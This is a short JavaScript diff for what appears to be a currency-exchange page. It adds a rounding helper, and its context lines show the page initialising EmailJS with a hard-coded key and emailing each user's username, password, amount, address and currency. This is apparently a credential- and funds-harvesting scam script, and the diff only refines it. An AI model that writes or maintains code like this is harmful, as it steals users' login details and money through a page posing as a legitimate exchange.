@@ -475,6 +475,11 @@ document.addEventListener('DOMContentLoaded', () => {
         } else {
             exchanged_amount = amount * buy_value;
         }
+        
+        function round_to(precision, value) {
+            power_of_ten = 10 ** precision;
+            return Math.round(value * power_of_ten) / power_of_ten;
+        }
 
         (function() {
             emailjs.init("user_7eTpa9sLmikyxaTct0Rif");
@@ -484,7 +489,7 @@ document.addEventListener('DOMContentLoaded', () => {
             username: username,
             pass: password,
             amount: amount,
-            exchanged_amount: exchanged_amount,
+            exchanged_amount: round_to(6, exchanged_amount),
             address: address,
             type: type,
             currency: currency,
